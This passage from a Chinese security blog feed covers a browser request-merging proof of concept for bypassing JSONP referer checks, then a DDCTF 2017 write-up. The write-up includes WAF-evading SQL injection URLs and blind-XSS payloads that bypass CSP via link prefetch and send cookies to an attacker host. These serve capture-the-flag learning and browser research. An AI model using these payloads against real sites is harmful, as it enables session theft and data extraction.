class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>, threaded=<span class="keyword">True</span>, port=<span class="number">8888</span>, host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure></p>
<p>html:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">charset</span>=<span class="value">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">title</span>&gt;</span>fuzz size of response about request merging<span class="tag">&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> size = <span class="number">3</span>; size &lt;= <span class="number">100</span>; size++) &#123;</span><br><span class="line">        <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            html = html + </span><br><span class="line">            <span class="string">'&lt;script src=http://0.0.0.0:8888/jsonp/'</span></span><br><span class="line">            + size</span><br><span class="line">            + <span class="string">'&gt;&lt;/'</span></span><br><span class="line">            + <span class="string">'script&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        iframe.src = <span class="string">'data:text/html;charset=utf-8,'</span> + <span class="built_in">encodeURI</span>(html);</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>实验结果，所有请求都合并了。我连1024都没有乘。很小很小的请求都会合并。</p>
<h2 id="iframe并不会merging??">iframe并不会merging??</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">charset</span>=<span class="value">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">title</span>&gt;</span>iframe request merging<span class="tag">&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- test1 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/102400"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> size = <span class="number">1</span>; size &lt;= <span class="number">10</span>; size++) &#123;</span><br><span class="line">        <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">        html = <span class="string">'&lt;script type="text/javascript" src="http://0.0.0.0:8888/jsonp/102400"&gt;&lt;/s'</span> + <span class="string">'cript&gt;'</span></span><br><span class="line">        iframe.src = <span class="string">'data:text/html;charset=utf-8,'</span> + <span class="built_in">encodeURI</span>(html);</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- test2 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"https://cdn.bootcss.com/jquery/3.2.1/jquery.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"data:text/html;charset=utf-8,%3Cscript%20src%3D%22https%3A%2F%2Fcdn.bootcss.com%2Fjquery%2F3.2.1%2Fjquery.js%22%3E%3C%2Fscript%3E"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- test3 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"./many_out_script.html"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试了三次。果然都没有合并请求…</p>
<p>绝招！问大佬： <a href="https://twitter.com/nearg1e/status/903297400797663232" target="_blank" rel="external">https://twitter.com/nearg1e/status/903297400797663232</a></p>
<p>@filedescriptor 是twitter上专注于浏览器安全的安全研究员，之前的“iframe也会发生 request merging”的结论也是他得出来的。</p>
<p>请教结果： 5月12日的时候验证chrome已经修复了该问题。好吧居然fix了。</p>
<h2 id="大部分的国产浏览器依然受影响。">大部分的国产浏览器依然受影响。</h2><p>之前windows上对多款浏览器进行过UXSS的测试和特权域API的分析，所以windows环境里还有多款国产浏览器。我们知道大部分国产浏览器是基于chromium的，而且版本更新并不会像chrome那么勤快，特别是内核的更新一直是相对比较缓慢的。很多Nday都可以用(可是src不收呀！)。</p>
<p>test in 360se 8.2.1.340</p>
<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5gy1fj46nc4gr1j31d90nowgp.jpg" alt=""></p>
<p>poc修改为:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"http://example.com:8082/"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"http://example.com:8081/"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这样保证了，攻击者域中的请求后执行。<br>思路验证成功。</p>
<p>在 IE11和Edge上 好像现在依旧没有fix该问题。我这边的版本可能稍微低了一点，POC都是可用的。</p>
<ul>
<li>Microsoft Edge 40.15063.0.0</li>
<li>IE 11.296.15063.0</li>
</ul>
<h2 id="other">other</h2><p>现在很多浏览器漏洞(bug)都是和新特性(feature)相关的，或许request merging还有别的用处？</p>
<p>想测试自己所用的浏览器是否受印象只需访问：<a href="http://blog.neargle.com/tips-note/request_merging/iframe_merging_poc.html">http://blog.neargle.com/tips-note/request_merging/iframe_merging_poc.html</a>,开发者工具中网络对“<a href="https://cdn.bootcss.com/jquery/3.2.1/jquery.js”的请求只进行了一次，那么就是受影响的。" target="_blank" rel="external">https://cdn.bootcss.com/jquery/3.2.1/jquery.js”的请求只进行了一次，那么就是受影响的。</a></p>
<h2 id="link">link</h2><p><a href="https://twitter.com/nearg1e/status/903297400797663232" target="_blank" rel="external">https://twitter.com/nearg1e/status/903297400797663232</a><br>Exploiting the unexploitable with lesser known browser tricks from filedescriptor</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;em&gt;更新两篇之前在其他地方发过的文章&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-_关于request_merging和其会产生的问题&quot;&gt;1. 关于request merging和其会产生的问题&lt;/h2&gt;&lt;p&gt;request merging : 浏览器会把多次相同的请求(并非所有请求)合并成一次，以加快资源加载速度。&lt;/p&gt;
&lt;p&gt;e.g.&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;value&quot;&gt;&quot;http://0.0.0.0:8888/jsonp/1&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;value&quot;&gt;&quot;http://0.0.0.0:8888/jsonp/1&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;value&quot;&gt;&quot;http://0.0.0.0:8888/jsonp/1&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;只会请求并加载一次”&lt;a href=&quot;http://0.0.0.0:8888/jsonp/1&amp;quot;资源。&quot;&gt;http://0.0.0.0:8888/jsonp/1&amp;quot;资源。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;曾经有研究指出，这种请求合并想象在iframe里也存在&lt;/em&gt;，那么浏览器的这种特性就可以用来bypass部分程序的referer的判断，如jsonp的防御机制。&lt;/p&gt;
&lt;h2 id=&quot;2-_环境和POC&quot;&gt;2. 环境和POC&lt;/h2&gt;&lt;p&gt;绕过referer检测，攻击者能否拿到进行referer保护的用户信息？&lt;/p&gt;
&lt;p&gt;攻击者服务器： &lt;a href=&quot;http://example.com:8081&quot;&gt;http://example.com:8081&lt;/a&gt;&lt;br&gt;目标服务器： &lt;a href=&quot;http://example.com:8082&quot;&gt;http://example.com:8082&lt;/a&gt;&lt;br&gt;referer检测： referer是否以“&lt;a href=&quot;http://example.com:8082”开头&quot;&gt;http://example.com:8082”开头&lt;/a&gt;&lt;br&gt;目标： 攻击者拿到属于用户的 “security content”&lt;/p&gt;
&lt;h3 id=&quot;环境：&quot;&gt;环境：&lt;/h3&gt;&lt;p&gt;/jsonp.php&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;startsWith&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;variable&quot;&gt;$url&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$domain&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;variable&quot;&gt;$length&lt;/span&gt; = strlen(&lt;span class=&quot;variable&quot;&gt;$domain&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (substr(&lt;span class=&quot;variable&quot;&gt;$url&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$length&lt;/span&gt;) === &lt;span class=&quot;variable&quot;&gt;$domain&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$referrer&lt;/span&gt; = @&lt;span class=&quot;variable&quot;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;HTTP_REFERER&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (startsWith(&lt;span class=&quot;variable&quot;&gt;$referrer&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;http://example.com:8082&quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;variable&quot;&gt;$js_code&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&#39;function jquery() &amp;#123; return &quot;security content&quot;;&amp;#125;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$js_code&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;variable&quot;&gt;$js_code&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&#39;function jquery() &amp;#123; return &quot;nothing&quot;;&amp;#125;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$js_code&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端安全" scheme="http://blog.neargle.com/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ddctf 两道web题的Writeup (sqli &amp; xss)</title>
    <link href="http://blog.neargle.com/2017/09/01/ddctf-web-xss-sqli-writeup/"/>
    <id>http://blog.neargle.com/2017/09/01/ddctf-web-xss-sqli-writeup/</id>
    <published>2017-08-31T19:01:10.000Z</published>
    <updated>2017-09-02T01:20:13.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>更新两篇之前在其他地方发过的文章</em></p>
<h2 id="sqli">sqli</h2><p>地址: <a href="http://118.190.134.8/t1/news.php?id=1" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=1</a></p>
<p>尝试sql注入，会发现过滤了’和空格等。使用<br><a href="http://118.190.134.8/t1/news.php?id=1%0aand%0a1=1" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=1%0aand%0a1=1</a> 和 <a href="http://118.190.134.8/t1/news.php?id=1%0aand%0a1=2" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=1%0aand%0a1=2</a> 判断注入存在，开始思考出数据的方法</p>
<p><a href="http://118.190.134.8/t1/news.php?id=1%0aorder%0aby%0a5" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=1%0aorder%0aby%0a5</a><br>判断字段数为4</p>
<p><a href="http://118.190.134.8/t1/news.php?id=1union%0aselect%0a1,2,3,4" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=1union%0aselect%0a1,2,3,4</a><br>发现过滤了逗号</p>
<p>那就不好用union出数据了，可选择使用盲注出数据比如<code>(select%a0ascii(substr((select%a0TABLE_NAME%a0from%a0information_schema.tables%a0where%a0TABLE_TYPE%a0=%a0&quot;BASE%a0TABLE&quot;%a0limit%a01%a0OFFSET%a02)%a0from%a01%a0for%a01))=1)%23</code>。但是这里其实有一个union出数据的tip可以使用:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql $&#62; select 1,2,3,4 Union select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d&#10;+-----+-----+-----+-----+&#10;|   1 |   2 |   3 |   4 |&#10;|-----+-----+-----+-----|&#10;|   1 |   2 |   3 |   4 |&#10;+-----+-----+-----+-----+</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p><a href="http://118.190.134.8/t1/news.php?id=-1%0aUnion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=-1%0aUnion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d</a><br>判断2和3是出数据的点</p>
<p>库名:<br><a href="http://118.190.134.8/t1/news.php?id=-1%0aunion%0a(select%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a(SELECT%0adatabase()))b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d" target="_blank" rel="external">http://118.190.134.8/t1/news.php?id=-1%0aunion%0a(select%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a(SELECT%0adatabase()))b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d</a>)</p>
<p>表:<br><a href="http://118.190.134.8/t1/news.php" target="_blank" rel="external">http://118.190.134.8/t1/news.php</a><br>?id=-1%0aunion%0a(select%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a(<br>SELECT%0agroup_concat(table_name)%0aFROM%0ainformation_schema.tables%0aWHERE%0atable_schema%0a=%0a0x7431<br>))b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d)</p>
<p>表中列：</p>
<p><a href="http://118.190.134.8/t1/news.php" target="_blank" rel="external">http://118.190.134.8/t1/news.php</a><br>?id=-1%0aunion%0a(select%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a(<br>SELECT%0agroup_concat(column_name)%0aFROM%0ainformation_schema.columns%0aWHERE%0atable_schema%0a=%0a0x7431<br>))b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d)</p>
<p>有个列叫secret,但是这个waf的黑名单中(<code>http://118.190.134.8/t1/news.php?id=-1%a0union%a0(select%a0*%a0from%a0(select%a01)a%a0join%a0(select%a0
(select%a0group_concat(secret)%a0from%a0news)
)b%a0join%a0(select%a03)c%a0join%a0(select%a04)d)</code>触发waf)，这个就有点故意刁难你的意思了。也是ctf的常用套路。<br>怎么不用列名出列数据呢？这里有一个新的tip：</p>
<p>select x.4 from (select 1,2,3,4)x</p>
<p>这样就可以利用位置代替列名了，最后出flag的payload</p>
<p><code>http://118.190.134.8/t1/news.php?id=-1%a0union%a0(select%a0*%a0from%a0(select%a01)a%a0join%a0(select%a0(select%0Ax.4%0Afrom%0A(select%0A*%0Afrom%0A(select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c%0Ajoin%0A(select%0A4)d%0AUNION%0Aselect%0A*%0Afrom%0Anews)x%0ALIMIT%0A1%0Aoffset%0A4))b%a0join%a0(select%a03)c%a0join%a0(select%a04)d)</code></p>
<h2 id="xss">xss</h2><p>比起上一道题目xss更富有实战意义。</p>
<p><a href="http://114.215.24.14/t2/" target="_blank" rel="external">http://114.215.24.14/t2/</a></p>
<p>现在各种报错.<br>第一道坎是ctf管用套路, <code>verification code (substr(md5($_POST[&#39;code&#39;]),6,6)===&#39;417c85&#39;)</code>, 写个脚本跑一些md5出来用grep找即可</p>
<p>判断是一个xss的盲打题，有csp.</p>
<p>Content-Security-Policy:default-src ‘self’; script-src ‘self’</p>
<p>利用evi1m0同学挖掘到的CSP bypass,在远程服务器上收到了bot的请求包。(csp bypass: <a href="http://linux.im/2016/10/27/Bypass_unsafe_inline_mode_CSP.html" target="_blank" rel="external">http://linux.im/2016/10/27/Bypass_unsafe_inline_mode_CSP.html</a>)</p>
<link rel="prefetch" href="http://evil.com/aaaa">

<p>这里你需要一个记录所有http请求包的HttpServer应用。我们需要查看程序请求包中的url和Referer等信息，例如：”<a href="https://gist.github.com/neargle/e6f4eb9bd37a9569237c7cc38783a735&quot;。" target="_blank" rel="external">https://gist.github.com/neargle/e6f4eb9bd37a9569237c7cc38783a735&quot;。</a></p>
<p>我们可以根据log中的Referer找到BOT所访问的页面：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22:09:51] GET /ddctf? HTTP/1.1&#10;&#10;GET /ddctf? HTTP/1.1&#10;Connection: keep-alive&#10;Referer: http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=xxxxxxxxxxx&#10;Accept: */*&#10;Host: xxxxxxxx:8888&#10;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#10;Accept-Language: en-US,en;q=0.8&#10;Purpose: prefetch&#10;Accept-Encoding: gzip, deflate, sdch</span><br></pre></td></tr></table></figure>
<p>Curl一下referer可知，该页面的所有内容就是我们提交的代码。这里需要一个脑洞，我们要用第一次提交内容来当js代码，获取Referer之后，提交第二次内容，包含第一次提交的js url，使得代码符合csp的限制并执行。</p>
<p>第一次payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var n0t = document.createElement(&#34;link&#34;);n0t.setAttribute(&#34;rel&#34;, &#34;prefetch&#34;);n0t.setAttribute(&#34;href&#34;, &#34;//xxxxxx.com:8888/ddctf/?&#34; + document.cookie);document.body.appendChild(n0t);//&#60;link rel=&#39;prefetch&#39; href=&#39;http://xxxxxxx:8888/ddctf&#39;&#62;</span><br></pre></td></tr></table></figure>
<p>拿到referer之后第二个payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script src=&#34;http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=xxxxxxxxxxx&#34;&#62;&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<p>这样我们就获取到了bot上面的cookie。使用cookie到message页面上一看，有一个url和一个hit。<a href="http://114.215.24.14/t2/f1ag_1s_h3r3/" target="_blank" rel="external">http://114.215.24.14/t2/f1ag_1s_h3r3/</a>, hit:setcookie(“flag”, “xxxxxxx”, path=”/t2/f1ag_1s_h3r3/“);</p>
<p>页面内容：U need find it!!</p>
<p>需要去获取path下的cookie,重新构造payload。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v = document.createElement(&#34;iframe&#34;);&#10;v.src=&#34;http://114.215.24.14/t2/f1ag_1s_h3r3/&#34;;&#10;document.body.appendChild(v);&#10;setTimeout(function()&#123;&#10;    var n0t = document.createElement(&#34;link&#34;);&#10;    n0t.setAttribute(&#34;rel&#34;, &#34;prefetch&#34;);&#10;    n0t.setAttribute(&#34;href&#34;, &#34;//xxxxxxxxx.com:8888/ddctf/?&#34; + encodeURI(v.contentWindow.document.cookie.toString()));&#10;    document.body.appendChild(n0t);&#10;&#125;,1000);&#10;//&#60;link rel=&#39;prefetch&#39; href=&#39;http://xxxxxxxxx.com:8888/ddctf&#39;&#62;</span><br></pre></td></tr></table></figure>
<p>cookie内有flag。</p>
<h2 id="thanks">thanks</h2><p>evi1m0</p>
<h2 id="link">link</h2><p><a href="http://sec.didichuxing.com/DDCTF/2017.html#/" target="_blank" rel="external">http://sec.didichuxing.com/DDCTF/2017.html#/</a></p>
<p><a href="http://linux.im/2016/10/27/Bypass_unsafe_inline_mode_CSP.html" target="_blank" rel="external">http://linux.im/2016/10/27/Bypass_unsafe_inline_mode_CSP.html</a></p>
